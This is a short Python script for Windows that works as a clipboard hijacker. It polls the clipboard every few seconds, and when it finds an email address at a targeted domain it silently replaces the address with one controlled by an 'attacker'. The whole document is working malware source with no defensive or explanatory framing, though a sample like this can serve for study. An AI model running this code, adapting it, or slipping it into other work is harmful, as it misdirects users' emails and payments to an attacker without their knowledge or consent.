import win32clipboard  # ty:ignore[unresolved-import]
import re
from time import sleep

attacker_email = "attacker"
email_regex = "^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$"

# manager@email.com
# host@alternate.com
# me@ahh.com


domains_to_replace = ["email.com", "alternate.com"]
while True:
    win32clipboard.OpenClipboard()
    try:
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT).rstrip()
    except TypeError as _t_e:
        print("Failed.")
        sleep(3)
        continue

    print("Checking...")
    if re.search(email_regex, data):
        entity, domain = data.split("@")
        if domain in domains_to_replace and entity != attacker_email:
            print(f"Found {data}, replacing...")
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(f"{attacker_email}@{domain}")
            print("Success!")
        # print(email := data.split('@'), email[1] in domains_to_replace)
        else:
            print(f"Found {data}, ignored.")
    else:
        print("Nothing.")

    win32clipboard.CloseClipboard()
    sleep(3)
